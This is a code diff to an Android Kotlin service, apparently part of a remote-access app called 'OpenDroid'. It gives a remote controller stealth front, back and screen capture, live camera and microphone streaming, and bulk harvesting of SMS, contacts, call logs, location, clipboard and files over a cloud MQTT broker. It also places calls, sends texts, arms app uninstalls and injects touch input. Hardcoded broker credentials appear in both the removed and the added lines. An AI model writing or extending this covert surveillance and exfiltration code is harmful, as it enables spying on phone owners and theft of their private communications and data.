@@ -55,6 +55,7 @@ class LocalFileServerService : Service() {
     private var isServerStartingOrRunning = false
     private lateinit var baseDir: File
     private var currentRingtone: Ringtone? = null
+
     private val wsMessageChannel = Channel<String>(Channel.UNLIMITED)
     private val mqttSendChannel = Channel<String>(Channel.UNLIMITED)
     private var mqttClient: MqttClient? = null
@@ -85,7 +86,6 @@ class LocalFileServerService : Service() {
         instance = this
         val prefs = getSharedPreferences("opendroid_prefs", Context.MODE_PRIVATE)
         currentPairingCode = prefs.getString("pairing_code", currentPairingCode) ?: currentPairingCode
-
         baseDir = getExternalFilesDir(null) ?: filesDir
         createNotificationChannel()
         registerReceiver(batteryReceiver, IntentFilter(Intent.ACTION_BATTERY_CHANGED))
@@ -105,7 +105,6 @@ class LocalFileServerService : Service() {
         teleManager.onLocationUpdated = { locJson ->
             broadcastMessage(locJson.toString())
         }
-
         stealthCaptureManager = StealthCaptureManager(applicationContext)
 
         startMqttWorker()
@@ -135,7 +134,12 @@ class LocalFileServerService : Service() {
             .build()
 
         if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.Q) {
-            startForeground(NOTIFICATION_ID, notification, ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC)
+            val serviceType = if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.R) {
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC or ServiceInfo.FOREGROUND_SERVICE_TYPE_CAMERA
+            } else {
+                ServiceInfo.FOREGROUND_SERVICE_TYPE_DATA_SYNC
+            }
+            startForeground(NOTIFICATION_ID, notification, serviceType)
         } else {
             startForeground(NOTIFICATION_ID, notification)
         }
@@ -156,7 +160,6 @@ class LocalFileServerService : Service() {
         }
     }
 
-    // Dedicated EMQX Serverless Private Cluster (SSL Encrypted)
     private fun initCloudBridge() {
         serviceScope.launch {
             try {
@@ -165,18 +168,17 @@ class LocalFileServerService : Service() {
                 mqttClient = MqttClient(brokerUrl, clientId, MemoryPersistence())
 
                 val options = MqttConnectOptions().apply {
-                    userName = "OpenDroid-v1"
-                    password = "OpenDroid-v1@kakaxi69".toCharArray()
-                    socketFactory = SSLSocketFactory.getDefault()
-                    isCleanSession = true
-                    connectionTimeout = 15
-                    keepAliveInterval = 30
+                    userName = "opendroid_user"
+                    password = "OpendroidPassword123!".toCharArray()
+                    connectionTimeout = 30
+                    keepAliveInterval = 60
                     isAutomaticReconnect = true
+                    isCleanSession = true
+                    socketFactory = SSLSocketFactory.getDefault()
                 }
 
                 mqttClient?.setCallback(object : MqttCallbackExtended {
                     override fun connectComplete(reconnect: Boolean, serverURI: String?) {
-                        Log.d("CloudBridge", "Connected to Dedicated EMQX: $currentPairingCode")
                         isCloudConnected = true
                         serviceScope.launch(Dispatchers.Main) {
                             onCloudStatusChanged?.invoke(true)
@@ -185,7 +187,6 @@ class LocalFileServerService : Service() {
                     }
 
                     override fun connectionLost(cause: Throwable?) {
-                        Log.w("CloudBridge", "Connection lost", cause)
                         isCloudConnected = false
                         serviceScope.launch(Dispatchers.Main) {
                             onCloudStatusChanged?.invoke(false)
@@ -240,9 +241,17 @@ class LocalFileServerService : Service() {
         broadcastBatteryStatus()
         try {
             broadcastMessage(teleManager.getLocation().toString())
+        } catch (e: Exception) { e.printStackTrace() }
+        try {
             broadcastMessage(JSONObject().put("type", "SMS_LIST").put("data", teleManager.getRecentSms()).toString())
+        } catch (e: Exception) { e.printStackTrace() }
+        try {
             broadcastMessage(JSONObject().put("type", "CONTACTS_LIST").put("data", teleManager.getContacts()).toString())
+        } catch (e: Exception) { e.printStackTrace() }
+        try {
             broadcastMessage(JSONObject().put("type", "STORAGE_STATS").put("data", teleManager.getStorageStats()).toString())
+        } catch (e: Exception) { e.printStackTrace() }
+        try {
             broadcastMessage(JSONObject().put("type", "CALL_LOGS_LIST").put("data", teleManager.getCallLogs()).toString())
         } catch (e: Exception) { e.printStackTrace() }
     }
@@ -259,10 +268,51 @@ class LocalFileServerService : Service() {
                     put("type", "BATTERY")
                     put("percent", pct)
                     put("charging", isCharging)
+                    put("device", Build.MODEL)
                 }
                 broadcastMessage(json.toString())
             }
-        } catch (e: Exception) { e.printStackTrace() }
+        } catch (e: Exception) {
+            e.printStackTrace()
+        }
+    }
+
+    private fun sendDirectCameraFrame(base64Jpeg: String) {
+        val json = JSONObject().apply {
+            put("type", "CAMERA_FRAME")
+            put("data", base64Jpeg)
+        }
+        val jsonStr = json.toString()
+        wsMessageChannel.trySend(jsonStr)
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                if (mqttClient?.isConnected == true) {
+                    val mqttMsg = MqttMessage(jsonStr.toByteArray()).apply { qos = 0 }
+                    mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
+                }
+            } catch (e: Exception) {
+                Log.e("DirectCamera", "Error publishing camera frame over MQTT", e)
+            }
+        }
+    }
+
+    private fun sendDirectAudioChunk(base64Pcm: String) {
+        val json = JSONObject().apply {
+            put("type", "AUDIO_CHUNK")
+            put("data", base64Pcm)
+        }
+        val jsonStr = json.toString()
+        wsMessageChannel.trySend(jsonStr)
+        serviceScope.launch(Dispatchers.IO) {
+            try {
+                if (mqttClient?.isConnected == true) {
+                    val mqttMsg = MqttMessage(jsonStr.toByteArray()).apply { qos = 0 }
+                    mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
+                }
+            } catch (e: Exception) {
+                Log.e("DirectAudio", "Error publishing audio chunk over MQTT", e)
+            }
+        }
     }
 
     fun broadcastMessage(msg: String) {
@@ -280,10 +330,8 @@ class LocalFileServerService : Service() {
         }
         val jsonStr = response.toString()
 
-        // 1. Send to local WebSocket clients
         wsMessageChannel.trySend(jsonStr)
 
-        // 2. Direct send to Cloud MQTT with QoS 0 (avoids Paho QoS 1 buffer overflow on large image payloads)
         serviceScope.launch(Dispatchers.IO) {
             try {
                 if (mqttClient?.isConnected == true) {
@@ -292,58 +340,7 @@ class LocalFileServerService : Service() {
                     Log.d("StealthCapture", "Dispatched $target capture result via MQTT (qos 0)")
                 }
             } catch (e: Exception) {
-                Log.e("StealthCapture", "Error publishing stealth capture result", e)
-            }
-        }
-    }
-
-    fun sendDirectCameraFrame(base64Frame: String) {
-        val json = JSONObject().apply {
-            put("type", "CAMERA_FRAME")
-            put("frame", base64Frame)
-        }.toString()
-
-        wsMessageChannel.trySend(json)
-        if (mqttClient?.isConnected == true) {
-            try {
-                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
-                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
-            } catch (e: Exception) {
-                Log.e("DirectCamera", "Frame publish error", e)
-            }
-        }
-    }
-
-    fun sendDirectScreenFrame(base64Frame: String) {
-        val json = JSONObject().apply {
-            put("type", "SCREEN_FRAME")
-            put("frame", base64Frame)
-        }.toString()
-
-        wsMessageChannel.trySend(json)
-        if (mqttClient?.isConnected == true) {
-            try {
-                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
-                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
-            } catch (e: Exception) {
-                Log.e("DirectScreen", "Screen frame publish error", e)
-            }
-        }
-    }
-
-    fun sendDirectAudioChunk(base64Pcm: String) {
-        val json = JSONObject().apply {
-            put("type", "AUDIO_CHUNK")
-            put("data", base64Pcm)
-        }.toString()
-
-        wsMessageChannel.trySend(json)
-        if (mqttClient?.isConnected == true) {
-            try {
-                val mqttMsg = MqttMessage(json.toByteArray()).apply { qos = 0 }
-                mqttClient?.publish("opendroid/$currentPairingCode/pc", mqttMsg)
-            } catch (e: Exception) {
-                Log.e("AudioStream", "Audio publish error", e)
+                Log.e("StealthCapture", "MQTT Direct Publish Error for $target", e)
             }
         }
     }
@@ -365,7 +362,7 @@ class LocalFileServerService : Service() {
                 sendFullSyncData()
             }
 
-            // --- Step 1.1: Remote URL Launcher ---
+            // --- Remote URL Launcher ---
             "OPEN_URL" -> {
                 val rawUrl = json.optString("url", "").trim()
                 if (rawUrl.isNotEmpty()) {
@@ -397,7 +394,7 @@ class LocalFileServerService : Service() {
                 }
             }
 
-            // --- Phase 1: Step 1.2 Remote App Management (Launch & Uninstall) ---
+            // --- Remote App Management (Launch & Uninstall) ---
             "LAUNCH_APP" -> {
                 val pkg = json.optString("package", "").trim()
                 val success = teleManager.launchApp(pkg)
@@ -410,6 +407,7 @@ class LocalFileServerService : Service() {
 
             "UNINSTALL_APP" -> {
                 val pkg = json.optString("package", "").trim()
+                RemoteInputService.isAutoUninstallArmed = true
                 val success = teleManager.requestUninstallApp(pkg)
                 broadcastMessage(JSONObject().apply {
                     put("type", "UNINSTALL_APP_ACK")
@@ -418,11 +416,9 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
-            // =========================================================================
-            // Phase 2: Stealth Photo / Screenshot Capture (Direct QoS 0 Dispatch)
-            // =========================================================================
+            // --- Stealth Photo / Screenshot Capture ---
             "STEALTH_CAPTURE" -> {
-                val target = json.optString("target", "FRONT").uppercase() // "FRONT", "BACK", "SCREEN"
+                val target = json.optString("target", "FRONT").uppercase()
                 Log.d("StealthCapture", "Received STEALTH_CAPTURE request for target: $target")
 
                 when (target) {
@@ -486,7 +482,7 @@ class LocalFileServerService : Service() {
                 }.toString())
             }
 
-            // --- Phase 1: Step 1.3 Standalone Flashlight / Torch Toggle ---
+            // --- Standalone Flashlight / Torch Toggle ---
             "TOGGLE_STANDALONE_TORCH" -> {
                 if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.M) {
                     try {
@@ -637,30 +633,149 @@ class LocalFileServerService : Service() {
                 RemoteInputService.instance?.dispatchSwipe(sx, sy, ex, ey)
             }
 
-            "INPUT_GLOBAL" -> {
-                val globalAction = json.optString("globalAction", "")
+            // --- Remote Touch / Gesture / Global Actions ---
+            "INPUT_GLOBAL", "GLOBAL_ACTION" -> {
+                val globalAction = if (json.has("actionType")) json.getString("actionType") else json.optString("globalAction", "")
                 RemoteInputService.instance?.executeGlobalAction(globalAction)
             }
 
-            // --- Telephony Actions ---
-            "CALL" -> {
-                val number = json.getString("number")
-                teleManager.makeCall(number)
+            // --- Telephony & SMS Actions ---
+            "MAKE_CALL", "CALL" -> {
+                val number = if (json.has("number")) json.getString("number") else json.optString("to", "")
+                if (number.isNotEmpty()) {
+                    teleManager.makeCall(number)
+                }
             }
 
             "SEND_SMS" -> {
-                val number = json.getString("number")
-                val message = json.getString("message")
-                val success = teleManager.sendSms(number, message)
+                val to = if (json.has("to")) json.getString("to") else json.optString("number", "")
+                val message = json.optString("message", "")
+                val success = teleManager.sendSms(to, message)
                 broadcastMessage(JSONObject().apply {
                     put("type", "SMS_SENT_STATUS")
                     put("success", success)
                 }.toString())
             }
 
-            // --- Audio Ring / Alarm ---
-            "PLAY_ALARM" -> playRingtone()
-            "STOP_ALARM" -> stopRingtone()
+            // --- Audio Ring / Alarm / Siren ---
+            "RING_SIREN", "PLAY_ALARM" -> playRingtone()
+            "STOP_SIREN", "STOP_ALARM" -> stopRingtone()
+
+            // --- General Fetch Actions Requested by WebOS ---
+            "FETCH_APPS" -> {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "APPS_LIST")
+                    put("data", teleManager.getInstalledApps())
+                }.toString())
+            }
+
+            "FETCH_AUDIO" -> {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "AUDIO_TRACKS_LIST")
+                    put("data", teleManager.getAudioTracks())
+                }.toString())
+            }
+
+            "FETCH_VIDEOS" -> {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "VIDEO_TRACKS_LIST")
+                    put("data", teleManager.getVideoTracks())
+                }.toString())
+            }
+
+            "FETCH_PHOTOS" -> {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "PHOTOS_LIST")
+                    put("data", teleManager.getRecentPhotos())
+                }.toString())
+            }
+
+            "FETCH_DIR" -> {
+                val path = json.optString("path", "")
+                broadcastMessage(JSONObject().apply {
+                    put("type", "DIR_CONTENTS")
+                    put("data", teleManager.getDirectoryContents(path))
+                }.toString())
+            }
+
+            "FETCH_CALL_LOGS" -> {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "CALL_LOGS_LIST")
+                    put("data", teleManager.getCallLogs())
+                }.toString())
+            }
+
+            "FETCH_SMS" -> {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "SMS_LIST")
+                    put("data", teleManager.getRecentSms())
+                }.toString())
+            }
+
+            "FETCH_CONTACTS" -> {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "CONTACTS_LIST")
+                    put("data", teleManager.getContacts())
+                }.toString())
+            }
+
+            "FETCH_STORAGE" -> {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "STORAGE_STATS")
+                    put("data", teleManager.getStorageStats())
+                }.toString())
+            }
+
+            "FETCH_LOCATION" -> {
+                broadcastMessage(teleManager.getLocation().toString())
+            }
+
+            "FETCH_CLIPBOARD" -> {
+                broadcastMessage(JSONObject().apply {
+                    put("type", "CLIPBOARD_DATA")
+                    put("text", teleManager.getClipboardText())
+                }.toString())
+            }
+
+            "SET_CLIPBOARD" -> {
+                val text = json.optString("text", "")
+                teleManager.setClipboardText(text)
+                broadcastMessage(JSONObject().apply {
+                    put("type", "CLIPBOARD_SET_ACK")
+                    put("success", true)
+                }.toString())
+            }
+
+            // --- Chunked File Transfer ---
+            "DOWNLOAD_FILE_CHUNK" -> {
+                val path = json.optString("path", "")
+                val offset = json.optLong("offset", 0L)
+                val chunkObj = teleManager.readFileChunk(path, offset)
+                broadcastMessage(JSONObject().apply {
+                    put("type", "FILE_DOWNLOAD_CHUNK")
+                    put("data", chunkObj)
+                }.toString())
+            }
+
+            "UPLOAD_FILE_CHUNK" -> {
+                val fileName = json.optString("fileName", "")
+                val targetPath = json.optString("targetPath", "")
+                val data = json.optString("data", "")
+                val isFirst = json.optBoolean("isFirst", false)
+                val isLast = json.optBoolean("isLast", false)
+                val success = teleManager.saveUploadedChunk(targetPath, fileName, data, isFirst, isLast)
+                if (isLast) {
+                    broadcastMessage(JSONObject().apply {
+                        put("type", "FILE_UPLOAD_COMPLETE")
+                        put("fileName", fileName)
+                    }.toString())
+                } else {
+                    broadcastMessage(JSONObject().apply {
+                        put("type", "FILE_UPLOAD_CHUNK_ACK")
+                        put("fileName", fileName)
+                    }.toString())
+                }
+            }
         }
     }
 
